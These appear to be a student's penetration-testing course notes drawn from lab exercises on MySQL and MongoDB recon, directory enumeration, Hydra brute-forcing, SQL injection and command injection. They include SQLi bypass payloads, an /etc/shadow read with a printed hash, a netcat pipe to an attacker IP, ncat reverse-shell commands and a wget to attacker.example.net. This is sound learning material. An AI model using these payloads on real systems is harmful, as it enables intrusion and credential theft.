- more on webshells: https://www.acunetix.com/blog/articles/introduction-web-shells-part-1/

- https://dev.mysql.com/doc/mysql-security-excerpt/8.0/en/connection-control-installation.html  <-- setting limits on number of queries in a db


## week 2 lab: mysql recon basics

session's target ip: 192.252.231.3
we use both metasploit and nmap scripts for the same db recons... 
some info we can get by just using the mysql console! e.g. loading readable files...


1. What is the version of MySQL server?
    * 5.5.62-0ubuntu0.14.04.1 
  
2. What command is used to connect to remote MySQL database?
    * `mysql -h <hostip> - u root` connects as root user
  
3. How many databases are present on the database server? 11 of them 
  
4. How many records are present in table “authors”? This table is present inside the “books” database.
    * use the `books` db, then `select count(*) from books.authors`

5. Dump the schema of all databases from the server using suitable metasploit module?
    * find the metasploit module: `use auxiliary/scanner/mysql/mysql_schemadump`
    * set the relevant options (RHOSTS, USERNAME, PASSWORD) and exploit
  
6. How many directories present in the /usr/share/metasploit-framework/data/wordlists/directory.txt, are writable? List the names.
   2, /tmp and /root

   use ***mysql_writable_dirs***

    ```
    use auxiliary/scanner/mysql/mysql_writable_dirs
    set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
    set RHOSTS 192.71.145.3
    set VERBOSE false
    set PASSWORD ""
    exploit
    ```
    manually look for writable dirs 

7. How many of sensitive files present in /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt are readable? List the names.
    use ***mysql_file_enum*** and the wordlist at `/usr/share/metasploit-framework/data/wordlists/sensitive_files.txt`

8. Find the system password hash for user "root".
    * since we know that the shadow file is present and readable, we enter the db as root and load the shadow file like so: `select load_file("/etc/shadow");`
    * the relevant part is: `root:$6$eoOI5IAu$S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWHRBHRntsKhgqnClY2.KC.vA/:17861:0:99999:7:::` the password is  `S1eBFuRRxwD7qEcUIjHxV7Rkj9OXaIGbIOiHsjPZF2uGmGBjRQ3rrQY3/6M.fWHRBHRntsKhgqnClY2.KC.vA/`
9. How many database users are present on the database server? Lists their names and password hashes.
    * `use auxiliary/scanner/mysql/mysql_hashdump` , set the required options and exploit 
    * this will return other usernames and the hashed versions of their passwords 



**NB: for nmap script arguments, doublecheck what the key should be , it's not always user or sql-user or username...**

10. Check whether anonymous login is allowed on MySQL Server.
    * use nmap's relevant script `nmap --script=mysql-empty-password -p 3306 192.252.231.3`
11. Check whether “InteractiveClient” capability is supported on the MySQL server.
    * use `nmap --script=mysql-info -p 3306 192.252.231.3`
12  Enumerate the users present on MySQL database server using mysql-users nmap script. ***note: this is for enumeration only***
    * ` nmap --script=mysql-users --script-args="mysqluser='root', mysqlpass=''" -p 3306 192.252.231.3`
13. List all databases stored on the MySQL Server using nmap script.
    * `nmap --script=mysql-databases --script-args="mysqluser='root', mysqlpass=''" -p 3306 192.252.231.3`
14. Find the data directory used by mysql server using nmap script.
    * `nmap --script=mysql-variables --script-args="mysqluser='root', mysqlpass=''" -p 3306 192.252.231.3` and look for the `datadir` field
15. Check whether File Privileges can be granted to non admin users using mysql_audi nmap script.
    * `nmap --script=mysql-audit --script-args="mysql-audit.username='root', mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'" -p 3306 192.252.231.3`
16. Dump all user hashes using  nmap script. revers to sql user not system users of that server
    * `nmap --script=mysql-dump-hashes --script-args="username='root', password=''" -p 3306 192.252.231.3`
17. Find the number of records stored in table “authors” in database “books” stored on MySQL Server using mysql-query nmap script.
  
***flag:*** note that system password hash (get it from /etc/shadow) and the mySQL hashing of mySQL user passwords are two completely diff things


## week2: mongodb recon basics

background: 
- target ip was `192.221.117.3` 

1. find version of mongoDB used
    * via a normal nmap services scan. `nmap-sV -p- <targetip>` **nb:** have to scan all ports since mongodb's is non-standard
      ans: 27017/tcp open  mongodb MongoDB 3.6.3

    * via mongo clients (trying to use mongo shell consoles): `mongo <target>`. ans: `MongoDB server version: 3.6.3`
2. since it's an unstructured db (No-SQL) we wanna know how many documents are inserted into this db: 
    * [using this nmap script](https://nmap.org/nsedoc/scripts/mongodb-info.html) we run `**nmap -p 27017 --script mongodb-info 192.195.41.3 | grep -A5 -B5 document**`
    * note the grep piping. the A and B flags refer to how many lines before and after the grep you wana print out 
    * ans: 29353
3. now we list the names of the dbs stored on the mongoDB server via nmap script ` nmap -p 27017 --script mongodb-databases 192.221.117.3   `
4. we can do the step 3 using the mongo client. we enter he console of the target server and: 
    * `mongo<target>`
    * `show dbs`
5. now on, we use the mongo client, we can list collections in a db by doing: 
    * `use <dbname>`
    * `show collections` 
6. and count the number of documents in a collection once using a db: `db.city.find().count()`


## wee2: from web to shell on the server 

in a kali install, look at `/usr/share/webshells/` for available webshells 
the aim is to take one of these webshells, open up sharing via simple http servers of some sort, then from within the compromised target (command injection vulnerability) in which we can execute commands, download the webshell from the attacker machine via wget. 
assumptions: root dir is somehow writeable  (maybe after escalation of privileges..)
we could do stuff like looking at config/ini files and getting root credentials for whatever db being used, and thereby making db queries


finally we just run the webshell!


[**about shadow files**](https://linuxize.com/post/etc-shadow-file/):
[**aboud shadow files and passwd file**](https://www.tldp.org/LDP/lame/LAME/linux-admin-made-easy/shadow-file-formats.html)

Shadow files are used in one of the various authentication schemes in linux, check against the `/etc/shadow` or `/etc/passwd` files. shadow file is a text file and it contains system users' pwds, owned by root.
there's a shadow format: 
  ```
  mark:$6$.n.:17736:0:99999:7:::
  [--] [----] [---] - [---] ----
  |      |      |   |   |   |||+-----------> 9. Unused
  |      |      |   |   |   ||+------------> 8. Expiration date
  |      |      |   |   |   |+-------------> 7. Inactivity period
  |      |      |   |   |   +--------------> 6. Warning period
  |      |      |   |   +------------------> 5. Maximum password age
  |      |      |   +----------------------> 4. Minimum password age
  |      |      +--------------------------> 3. Last password change
  |      +---------------------------------> 2. Encrypted Password
  +----------------------------------------> 1. Username
  ```

  The encrypted password field has the format: `$type$salt$hashed format`
  common types of encryption: `$1$` – MD5  `$2a$` – Blowfish  `$2y$` – Eksblowfish  `$5$` – SHA-256   `$6$` – SHA-512



# Day 3: directory enumeration and the various tools for it

**why enumerate?**

* go broad first then slowly focus on the finer things. don't just brute-force your way through looking for a vulnerability
* see what a webserver actually serves and if there's some data leaked in some dir
* don't see dir enumeration as some low-hanging fruit, it can be really useful
* usually config problems happen because dev and deployment end up being done by diff ppl/teams

* **NB**: wordlists (e.g. for password attacks) are geographically unique too, that's why it's a good idea to try out different wordlists when doing dictionary attacks 

* benefit of searching for specific file types, amplifying the search by specific file extensions: 
    * searching for .txt files: when backups created as zip files... and have user credentials... encrypted zip files w weak passwords are very easy to break...
    * look at active scripts like php
        examples of useful active php scripts if available:
        - `installation.php` install scripts there [mihgt be possbile to reset the entire application]
        - `register.php` 
        - `php.info`: info scripts will have config related info, might be useful
        - `phpinfo.php` will literally give all sorts of config info and service availability!


* note that if server detects your use of wordlists, (e.g. too many threads created, too little time difference b/w requests) then connection speed might be throttled.

* note that spidering is usually illegal, we should check on our own jurisdiction and laws


* ***HTTP Status codes can be really useful as well***: see HTTP code as well: if `500` then can see a huge stack trace if `debug=true` still there errors are not always bad

- can search for [blank-file extensions](https://office-watch.com/2014/opening-a-mystery-file-with-no-extension/). These are just files with MIME type fields that might still be able to tell us more about the contents within them. Look for a [Content type header](https://www.w3.org/Protocols/rfc1341/4_Content-Type.html) and also, this is what [MIME type means](https://stackoverflow.com/questions/3828352/what-is-a-mime-type)

* there's no diff in enumerating http and https websites. it will work the same.

* cookies and authentication: 
 Generally, you will encounter applications which does not require an authenticated session for directory/file enumeration. However, sometimes the web application is designed in a way that you can only access particular directory when you are an authenticated user. Please note, HTTP is a stateless protocol, the most common approach towards maintaining session is with a cookie. 

So for e.g, in case the application only allows the authenticated user to view the directory/files. What you will have to do in this case is 

1. Login as a user. 
2. Retrieve the cookie. 
3. Pass the cookie to dirb. 

This way dirb will act as an authenticated user trying to access various directory/files.


## more on crawling

* crawling behgins from webpages and not wordlists. this means that in case a directory is not referenced in any of the webpages, it will never get into the sitemap. (meanwhile dir enum happens via a wordlist)

* 

* Sitemap display all of the webpages and directory which have been discovered till now. Please note, you might not be accessing the webpages directly and many webpages would have been called with AJAX. Sometimes as a developer you might pay more attention to the main pages and make sure that there are no vulnerability on the main page, but you might notice that the webpages which are called with AJAX might have some vulnerability in it. The whole idea of having sitemap is that all the webpages are know to you and you can test all the webpages out and not just the webpages which can be accessed directly.

### week 3 lab: dirb directory enum

* In case of directory enumeration, the folder/files are discovered on dictionary attack (along with files which are discovered because directory listing is enabled on the server). In case of crawling, The links on the webpages are crawled, for e.g if Page a has link to page b, page b will be added to sitemap. In case of directory bursting, crawling is not done. i.e if the name of page b is not in the wordlist it will never get added to the sitemap.
    *

* wordlists can be changed, usual wordlist is at `/usr/share/wordlists/dirb/common.txt`


* can look for specific file-types using the `-X` flag! e.g. searching just for textfiles or config files or active scripts (php scripts maybe). we can also make a file that lists out certain file extensions and pass `-x <filename>` to that so dirb amplifies search for all those file extensions
   
* recursively searching within dir: 
    - stop it using `-r` prevents recursive searching

* you'd want to filter out certain response cods (e.g. 403 unauthorised) so use the `-N <status code>` flag




0. basic recon info: 
    * target ip: 192.238.2.3
    ```
        PORT     STATE SERVICE VERSION
        80/tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
        3306/tcp open  mysql   MySQL 5.5.47-0ubuntu0.14.04.1
    ```

    - basically this lab is just to try out the various flags for the `dirb` tool

## week3 lab: [dirbuster directory enum](https://www.hackingarticles.in/comprehensive-guide-on-dirbuster-tool/)

- dirbuster can control the thread count, that's a benefit, but beware being network-throttled 


- Dirbuster can follow redirects!

- by controlling the number of requests per second, thread count and the request timeout duration, we can avoid server detection


## week 3 lab: [burpsuite directory enum]()

- note that the free version has some limitations:

    * need to config a [payload position](https://portswigger.net/burp/documentation/desktop/tools/intruder/positions) : 
    ```http            
    GET /§name§ HTTP/1.0
    Cookie: c=cval
    Content-Length: 17 \r\n
    ```
    here, the `§name§` is a placeholder for the various words that we gonna try with
    * the payload you use can't add an entire list file, must add strings word by word.
    * it's awfully slow to do a full enumeration

* burpsuite is horrible when runing an entire dictionary attack but allows us to tweak payload positions and all so might be really useful when searching for specific directories and resources


## week 3 lab: [gobuster](https://github.com/OJ/gobuster)

[see more on the motivation behind creating gobuster and the maker's intended use case](https://tools.kali.org/web-applications/gobuster), basically he wanted it to be super fast and lightweight. 

- gobuster is very fast and efficient, but you need to explicitly provide the target and the wordlists and other arguments. it doesn't automatically use default parameters for some of the arguments.
    * take note that enumerating multiple arguments to a particular flag, you have to use commas to separate them e.g. 
    `$ gobuster dir -u http://192.156.207.3/data -w /usr/share/wordlists/dirb/common.txt -b 403,404 -x .php,.xml,.txt -r`
- the exclusion of status codes is possible via the `-b` flag

### week 3 lab: [opendoor]()

- the benefit of using opendoor is the generation of reports in the various formats. e.g. using html, we can view the results easily.

- question: it seems that the colour coded outputs of the dictionary searching doesn't really get printed out, could just be a bug but the reports generated seems to be done properly though, just that the cli output isn't that verbose

* Opendoor requires host as a parameter and not a URL, therefore it will only consider the host part and it will ignore the path. 
    * so have to do: `opendoor --host http://192.156.207.3/ -s directories -w /usr/share/wordlists/dirb/common.txt -e php,txt.xml --prefix data/"` instead of putting the host as `http://192.156.207.3/data`


### week3 lab: [zaproxy](https://www.zaproxy.org/)

zaproxy seems to have a really useful gui with a hud that overlays and feeds info. really nice to use!

#### directory enum with zaproxy

* By default, ZAP only has one wordlist for fuzzing. The wordlists are present in the directory `/root/.ZAP/fuzzers/dirbuster/`. that's why it's a good idea to copy over the dirb's wordlists to this directory: `cp /usr/share/wordlists/dirb/common.txt ~/.ZAP/fuzzers/dirbuster/`

* ZAP passively scans all of the requests proxied through it or generated by components like the traditional and AJAX spiders. Passive scanning just involves looking at the raw requests and responses - nothing is changed so it is considered safe to use. 

* Active scanning attempts to find other vulnerabilities by using known attacks against the selected targets. Active scanning is a real attack on those targets and can put the targets at risk, so do not use active scanning against targets you do not have permission to test. 

As long as you are accessing web pages through ZAP, you are performing passive crawling. But as soon as you start the spider, it turns into active crawling.

#### active crawling with zaproxy

* note that for active crawling, link discovery is done through html


## webapp scanning

the idea is to collate vulnerabilities on a target website.

### week3: webapp scanning with [nikto](https://cirt.net/Nikto2)

- note that nikto is a vulnerability scanning tool 
- nikto gives like an audit report of sorts, tells us what is interesting to possibly look into
- this lab exploited [Local File Inclusion Vulnerability](https://www.netsparker.com/blog/web-security/local-file-inclusion-vulnerability/). Taxonomy for such a vulnerability: 
  - Broken Access Control --> Insecure Direct Object References -->  Local File Inclusion
  * Basically it deals with how files are accessed by the webapp, if not configured properly, can glean loads of other files in the server by passing in the correct url params. 

- here's a [nikto cheatsheet](https://redteamtutorials.com/2018/10/24/nikto-cheatsheet/)


### week 3: webapp scanning using zaproxy

- passive and active crawling and classifying found vulnerabilities according to risk level.
- this lab teaches how to config zaproxy to use an authenticated session:
  - crawl to the login request part, then rightclick and select the inclusion of a context choose default context. add relevant info
  - establish a user, set the lock user context feature, now we can spider and active scan in the context of that known user account

- zaproxy's hud is so convenient, it shows what possbile vulnerabilites have been detected, including what payloads to use to test those. some basic bugs can be explored on [***bWAPP***](http://www.itsecgames.com/)
  
## xss attacking and sql injections

### week 3: using [xsser](https://github.com/epsylon/xsser) for xss attacks 

- for an input field, intercept the http packet using burp

### week 3: using sqlmap

# day 4: authentication, cracking passwords and code injections

* encoding was never intended to secure things, it's mainly to prevent interference in characters...


## Authentication in HTTP

**these refer to the Schemas at the HTTP layer. Form authentication is at the application layer instead.** 
you can have a form that does both app layer and then a httplayer auth as a budget-2factor auth of sorts but q useless.

there are 3 main ways we can implement authentication: (indicated by the `WWW-Authenticate` HTTP header)
1. [HTTP Basic Authentication](https://docs.oracle.com/cd/E19226-01/820-7627/bncbo/index.html)
    * server requests for account credentials when client attempts to access a protected resource, and when client provides it, server does a lookup to see if the credentials are valid. 
        * usually the credentials are input in a dialogue box...
    * the code is HTTP code written w the `<login-config>` tags in the **deployment descriptor** (seems like an )
    * insecure, sent with base64 encoding (no hashing done) via text can be intercepted if someone is sniffing the network (e.g. free public wifi) but it's probably okay if you're doing it over SSL or VPN (via secure transport mechanisms)
    * also is secure enough if used over TLS/SSL 
        * note that in general, using basic auth over HTTPS does roughly the same stuff as using Digest Authentication, but then again the basic auth implementation is vulnerable to phishing attacks ( this use of HTTPS relies upon the end user to accurately validate that they are accessing the correct URL each time to prevent sending their password to an untrusted server, which results in phishing attacks. Users often fail to do this, which is why phishing has become the most common form of security breach) 
2. [Digest Authentication](https://en.wikipedia.org/wiki/Digest_access_authentication)
    * take note on the concept of [security realms](https://docs.oracle.com/cd/E13222_01/wls/docs90/secintro/realm_chap.html)
    * the account credentials are hashed first before being sent over the network
    * MD5 cryto hashing is used and there's a [nonce value](https://en.wikipedia.org/wiki/Cryptographic_nonce) used for this too. nonce values have timestamps and that's another way that replay attacks are mitigated.
        * md5 hash is a 16-byte value and is intended to be a [one-way ](https://en.wikipedia.org/wiki/One-way_functionauthentication) but can bruteforce to find out the input for a given output if the input is weak
        * note that [MD5 hashing](https://en.wikipedia.org/wiki/MD5) isn't secure as suffers from collision attacks but somehow still used and can somewhat safely be used to generate checksums to check for fidelity as a result of unintentional abberations (like not a proper attack w intention)
    * uses the HTTP protocol
    * vulnerable to [MITM]https://en.wikipedia.org/wiki/Man-in-the-middle_attack) attacks where the Middle man tells the client that it's a basick auth, then obtains the account credentials from that 


    **RFC 2069**: 
      * server response has a nonce and an [opaque](https://medium.com/@billatnapier/opaque-one-of-the-great-advancements-in-cybersecurity-aace51a76560) (doesn't play any role for rfc2069)
      * nonce and oqaque have to be the same, browser will generate a response (for the server's request for auth) and sends it to the server
        * the creation for the response is done via md5 hash where both the account credentials and the request header are hashed
            * h1 = hash(Username:Realm:Password)  <--- `:` represents concatenation
            * h2 = hash(method:URI)
            * response = hash(hash1:nonce:hash2) <--- hashing the concatenation of h1,h2
    * **RFC 2671**: 
      * adds _client based nonces_, `cnonce` that mitigate chosen plain-text attacks
      * there an additionally field of QOP (quality of protection)
      * the hash1 and 2 are calculated in the exact same way, only the response's calculation is changed to : 
        `response = md5(hash1:nonce:noncecount:client-nonce:QOP:hash2)`

3. [Token Based Authentication](https://auth0.com/learn/token-based-authentication-made-easy/) that use [access tokens](https://en.wikipedia.org/wiki/Access_token)
    * The general concept behind a token-based authentication system is simple. Allow users to enter their username and password in order to obtain a token which allows them to fetch a specific resource - without using their username and password. Once their to ken has been obtained, the user can offer the token - which offers access to a specific resource for a time period - to the remote site. Using some form of authentication: a header, GET or POST request, or a cookie of some kind, the site can then determin e what level of access the request in question should be afforded. [useful description](https://www.w3.org/2001/sw/Europe/events/foaf-galway/papers/fp/token_based_authentication/)

### Week 3 Labs: [Hydra](https://www.mankier.com/1/hydra) and HTTP auth

0. do the usal recon for the target, looking for ip, what services there exist and on which port...
1. identify the type of auth used for the protected resources 
  * do a curl request to that end point and look at the header for the response.
    ```http
    HTTP/1.1 401 Unauthorized
    Date: Thu, 28 May 2020 11:18:43 GMT
    Server: Apache/2.4.7 (Ubuntu)
    WWW-Authenticate: Basic realm="private"
    Content-Type: text/html; charset=iso-8859-1
    ```

    ```bash
    root@attackdefense:~# curl -I 192.11.202.3/digest/
    HTTP/1.1 401 Unauthorized
    Date: Thu, 28 May 2020 11:22:38 GMT
    Server: Apache/2.4.7 (Ubuntu)
    WWW-Authenticate: Digest realm="Private", nonce="x8rJi7OmBQA=54ad25cea76a4b01f383aca826d28538fc132495", algorithm=MD5, qop="auth"
    Content-Type: text/html; charset=iso-8859-1
    ```

2. use hydra to crack basic http auth: 
    * `hydra -l admin -P /root/Desktop/wordlists/100-common-passwords.txt $target http-get /basic/`

  * establish a login via curl: 
    * `curl -u admin:cookie1 <target path>`

3. use hydra to crack digest http auth: 
    * the same steps as in step 2

### Week 3: using [hydra to attack form login](https://linuxhint.com/crack-web-based-login-page-with-hydra-in-kali-linux/)

0. do the usual recon, go to the login form, inspect element and see what end point the form is sending data to for the auth, what input fields are in the form..
1. prepare the username lists and password lists in separate files which we pass to hydra later. we do this cuz we know exactly what unames to use...
2.  call hydra, using `$ hydra -L usernames -P passwords 192.208.137.3 http-post-form "/login.php:login=^USER^&password=^`
    * note that the string param to the hydra command is like `<login path> : <login parameters> : <what string you don't want to see in the response i.e. the failed criteria>`
    * the invalid credentials part is dependent on how the applcation was made. specific to the design by the dev. that's why don't have a flash message for forms that says something like `"user doesn't exist"`. basically don't have a simple system where it's easy for an attacker to enumerate thru and test easily
    * note that organisations (e.g. schools) might have usernames leaked, making it easy to crack because now we just have to do dict attack for the password
    * **usability and security can pretty much be orthogonal**

### week 3: using zapproxy to attack form logins

- pretty much as expected, we passive crawl to get the request for that form, then use the **fuzzer** tool along with some payload to dictionary attack that, not sure if can actually pass in wordlist files though.

### week 4: burpsuite login form attack

- burp has various attack methods, look into it 
  * e.g. cluster bomb:  tries out 10 pwds for every uname and then changes the pwd-uname..


## OWASP (open web application security project) top 10

it's like a hall of fame for vulnerabilities


### [Injection Attacks](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A1-Injection)

- scanners and fuzzers can help find such injection flaws
- vulnerability happens when the app relies on user-supplied data and not sufficient sanitisation of such user input is done.
- Some of the more common injections are SQL, NoSQL, OS command, Object Relational Mapping (ORM), LDAP, and Expression Language (EL) or Object Graph Navigation Library (OGNL) injection.
  
* not exactly sure how, but [ping testing websites are useful somehow](https://www.site24x7.com/ping-test.html)


#### Week4 lab: OS command injection, blind and non-blind (3 labs underthis)

in the case where the injection is a blind injection, we have no way of directly seeing the output for the commands we inject, hence we do something like so: 

1. on attacker's machine, open up a port using [netcat](https://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf) and listen: `$ nc -lvp 4444`
2. now, using netcat, we can pipe the output of the blind command to the attacker machine w known listening port: `127.0.0.1 | nc 192.169.13.2 4444` <--- this goes into the input field of the form in that bWAPP page for pinging things

##### reverse shell vs bind shell

[here's a medium article comparing the two](https://medium.com/@PenTest_duck/bind-vs-reverse-vs-encrypted-shells-what-should-you-use-6ead1d947aa9)

a bind shell binds some port in the target machine, to listen for commands. Consequences:
  * anyone can send commands to that port 
  * a case whereby the victim's firewall ends up blocking traffic on that port, rendering the backdoor as useless


In order to setup a Netcat reverse shell we need to follow the following steps:

  1. Setup a Netcat listener.
  2. Connect to the Netcat listener from the target host.
  3. Issue commands on the target host from the attack box.

Bind shells:
```
Target: ncat -nvlp <port> -e {/bin/bash | cmd.exe} --ssl
Attacker: ncat -nv <target-ip> <port>--ssl
```
Reverse shells:
```
Target: ncat -nv <target-ip> <port> -e {/bin/bash | cmd.exe} --ssl
Attacker: ncat -nvlp <port>--ssl
```


note that reverse shell's traffic should be encrypted, for which there's the tool called [sbd, secure shell backdoor](https://tools.kali.org/maintaining-access/sbd)



##### tool: netcat

here's a [netcat tutorial series](https://www.hackingtutorials.org/networking/hacking-with-netcat-part-1-the-basics/)

 Most common use for Netcat when it comes to hacking is setting up reverse and bind shells, piping and redirecting network traffic, port listening, debugging programs and scripts and banner grabbing.

#### week 4 lab: bind vs reverse shell

1. recon shows that target is running the XODA application, we attempt to look for metasploit module for that. within msfconsole, `search xoda`
2. use identified module, set the relevant params, then `show payloads` to see available payloads for this particular exploit
3. upon using the exploit, we can verify network connections using `netstat` <-- shows the local address and port, what protocol and which foreign ip it's communicating with


### XSS

Here's how zaproxy describes xss: 
> Cross-site Scripting (XSS) is an attack technique that involves echoing attacker-supplied code into a user's browser instance. A browser instance can be a standard web browser client, or a browser object embedded in a software product such as the browser within WinAmp, an RSS reader, or an email client. The code itself is usually written in HTML/JavaScript, but may also extend to VBScript, ActiveX, Java, Flash, or any other browser-supported technology.
> When an attacker gets a user's browser to execute his/her code, the code will run within the security context (or zone) of the hosting web site. With this level of privilege, the code has the ability to read, modify and transmit any sensitive data accessible by the browser. A Cross-site Scripted user could have his/her account hijacked (cookie theft), their browser redirected to another location, or possibly shown fraudulent content delivered by the web site they are visiting. Cross-site Scripting attacks essentially compromise the trust relationship between a user and the web site. Applications utilizing browser object instances which load content from the file system may execute code under the local machine zone allowing for system compromise.
> There are three types of Cross-site Scripting attacks: non-persistent, persistent and DOM-based.
>Non-persistent attacks and DOM-based attacks require a user to either visit a specially crafted link laced with malicious code, or visit a malicious web page containing a web form, which when posted to the vulnerable site, will mount the attack. Using a malicious form will oftentimes take place when the vulnerable resource only accepts HTTP POST requests. In such a case, the form can be submitted automatically, without the victim's knowledge (e.g. by using JavaScript). Upon clicking on the malicious link or submitting the malicious form, the XSS payload will get echoed back and will get interpreted by the user's browser and execute. Another technique to send almost arbitrary requests (GET and POST) is by using an embedded client, such as Adobe Flash.
> Persistent attacks occur when the malicious code is submitted to a web site where it's stored for a period of time. Examples of an attacker's favorite targets often include message board posts, web mail messages, and web chat software. The unsuspecting user is not required to interact with any additional site/link (e.g. an attacker site or a malicious link sent via email), just simply view the web page containing the code.


# day 5: OWASP top10: Injections, Broken Auth, Improper Sessions Management & Sensitive Data Exposure

[this is a good brief on owasp top10](https://www.cloudflare.com/learning/security/threats/owasp-top-10/) and this describes things in so much more [detail](https://www.troyhunt.com/owasp-top-10-for-net-developers-part-1/)

why the same kinda vulnerabilities persist despite all the patches: 
- basically the dev's profile
- most webdev courses ignore the security aspects
- functionality first somehow always
- most software dev by junior devs


## A1: Injection Attacks

aim: security triangle of confidentiality, integrity, and availability to be completely compromised.


[brief on command injection](https://gracefulsecurity.com/command-injection-the-good-the-bad-and-the-blind/): 
  * in blind situations, we can chain commands like sleep that will help us guess whether the app is vulnerable to command injection
  * out of bands command injection: when the commands run on a separate thread and you can't use cmds like `sleep` to determing if it's vulnerable or not. For this, can do something like: `http://ci.example.org/blind.php?address=127.0.0.1 && wget http://attacker.example.net/?attacksuccessful` where  the wget command online requests the server download a web page. Therefore the attacker could see that the payload worked successfully as their logs would show a GET request to the file: `/?attacksuccessful`


[understanding url parameters](https://www.urlencoder.io/learn/) 
  - special and reserved chars shall be [encoded either in hexadec, following the `%` sign](https://secure.n-able.com/webhelp/NC_9-1-0_SO_en/Content/SA_docs/API_Level_Integration/API_Integration_URLEncoding.html) 

**SQLi**:
- a sqli attack is likea stepping stone. a successful payload injection can allow the attacker to bypass auth and do crud actions on the data!
  - basically total compromise is possible.

- types of SQLi:  
  - classic injection 
    - union based sql injection
    - error based sql injection
  - blind sql injection
    - boolean based
    - time based 
  - out of band sql injection


- a overview and a [walkthrough on it](https://www.acunetix.com/blog/articles/exploiting-sql-injection-example/)
  * identifying whether SQL vulnerability exists: 
    * generic SQLi payloads: 
      * easiest way is to append a single quote `'` which will break the sql syntax and throw error
      * `' or '1'='1`
      * `– ' or '1'='1' --` (Comment)
      * `– ' or '1'='1' #` (Comment)
    * ^ the comment char depends on the sql engine chosen
    * note, when initially playing around w an input field, what we are looking for is to see if our input causes the output of the application to change in any way. Ideally, we want to see an SQL error which could indicate that our input is parsed as part of a query
  * Determining the table schema
    * rmb that the db organisation might be non-standard, look propery to understand the table structures
    * this seems like a schema dump, concatenated as a single string `/endpoint.php?user=-1+union+select+1,2,3,4,5,6,7,8,9,(SELECT+group_concat(table_name)+from+information_schema.tables+where+table_schema=database())`
  * Attempt to find out user credentials, opbtain the admin's hashed pwd, following which do a dictionary attack on it to determine the action passoword (this article uses hashcat)
      * using hashcat: 
      ```
      hashcat64 -m 400 -a 0 hash.txt wordlist.txt
      -m = the type of the hash we want to crack. 400 is the hash type for WordPress (MD5)
      -a = the attack mode. 0 is the Dictionary (or Straight) Attack
      hash.txt = a file containing the hash we want to crack
      wordlist.txt = a file containing a list of passwords in plaintext
      ```


**nb:** sanitising and validating data are two different things: sanitation: removing suspicious parts of the data, validation: rejecting suspicious data

### week5 lab: SQLi bypassing auth, Free Article Submission

- the [free article submission exploit](https://www.exploit-db.com/exploits/35492)
- basically, the overall search function in the webpage implies that the input fields aren't sanitised.
  - check the `/admin` endpoint, attempt to let the auth pass by passing in the `" OR 1=1 #`

### week5 lab: SQL Injection -CVE: OpenSupports
- just reading the report on exploit db for the way to breach it. 
- this required both the user and pwd fields to have the same payload, I don't really understand how it works though. QQ: how does this payload work :(

### week 5 lab: SQL Injection
cid=1901
**the first part is to inject into a login form to bypass auth** 
- the payload is: `' or '1'='1`
  put in both the uname and the pwd, and it results in the following query behind the scenes: `Select * from users where login='' or '1'='1' and password='' or '1'='1';`
- alternatively, comment out the pwd field, here, from nmap, we know that it's running a MySQL server, so the syntax for commenting things out will be `--` or `#`
  - for the pwd field, you have to close off the opened single apostrophe, so pass in `'` for the pwd field and for the uname field, pass in `` or '1'='1' --` to comment out the rest of the concatenated sql query
  - the overall sql query becomes `Select * from users where login='' or '1'='1' -- ' and password='';`

**the second part is to inject into a search field that uses HTTP GET** 
- from just passing in `'` we know the query looks something like this: 
  - `select * from movies where title like '%'%'`
- a payload of `' or '1'='1` will return true for everything and dump all the available data!, the query will be `select * from movies where title like '%' or '1'='1%'`
- payload can also include comment too: `' or '1'='1' #`, making the query `select * from movies where title like '%' or '1'='1' # %'` 

**next part involves an input field that does a GET request to select from a db** 
- here we try to inject code directly into the input params, check if that works first
  - the test input of one `'` is actually `select * from movies where id = '` 
- our payload shall be just `1 or 1=1` i think no need to put as a string cuz url params, being ASCII shall always be read as a string by the browser.
- hints at server-side check that fetches only a single record, so we try to modify the limit: 
  - `1 or 1=1 limit 2,1` <-- returns the third row of the table, change accordingly

**SQL injection on a POST request** 
- here, to accurately determine the HTTP method, just use a proxy, e.g. burpsuite to modify the request and inject directly into the HTTP packet

QQ: why didn't it work when the comment char `--` was used???
ans: check discord, the answer is there somewhere

* more on injection attacks: 
    - https://www.cloudflare.com/learning/security/threats/owasp-top-10/
    - https://www.troyhunt.com/owasp-top-10-for-net-developers-part-1/
    - [some php object injection cheat sheet, but i don't understand the php code :(](https://nitesculucian.github.io/2018/10/05/php-object-injection-cheat-sheet/)




## A2: broken auth

* **Authentication** vs **Authorisation**: 
  * auth verifies user/process identity
  * authorisation is the system mech that determines privileges and access rights to system resources
* vulnerability via broken auth, examples: 
  * credential stuffing can be done (permitted)? 
  * brute force/automated attacks can be done
  * default/weak pwd use
  * weak credential recovery processes
  * plain text/weak hashing done on pwd
  * missing/useless multi-factor auth
  * session ID related: 
    * session ID is exposed in the url params 
    * session ID not rotated after sucessful logins (can do replay attacks due to this?)
    * validation for session ID not done properly 


### week5: Broken Auth - Airline Booking – Update cookie
cid=438
- setting up burpsuite on our own computer, need to control proxy settings, don't fully understand everything yet actually.
- the [exploit](https://www.exploit-db.com/exploits/39167) involves adding the following cookie: `Cookie: LoggedIn=yes` to the request for admin control panel and this cookie-based Authentication meant we just need the correct cookie.

* [examples of broken auth](https://hdivsecurity.com/owasp-broken-authentication)

* [authentication vs authorisation](https://auth0.com/docs/authorization/concepts/authz-and-authn): 
    * tokens used: authentication would use an id token and authorisation would use an access token
    * Authentication invovles challenging the user to validate creds while authorisation involves verifying if policies allow the user to access the resource.
    * In short, access to a resource is protected by both authentication and authorization. If you can't prove your identity, you won't be allowed into a resource. And even if you can prove your identity, if you are not authorized for that resource, you will still be denied access.









### Week 5 lab: Improper Session Management – Manipulate URL parameter
e

refer: https://youtu.be/Yt-5Fgg-u_4
https://www.attackdefense.com/challengedetails?cid=1899

***Improper Session Management II– Manipulate cookie***
refer: https://youtu.be/BvrKOK9Z7ok
https://www.attackdefense.com/challengedetails?cid=1899

***Decoding Encoded Cookie – Base64***
https://youtu.be/NnweEYixzQg
https://www.attackdefense.com/challengedetails?cid=1899

***Sensitive data in web storage –inspect element from browser***
https://youtu.be/Y_6bbhD8x3o
https://www.attackdefense.com/challengedetails?cid=1899
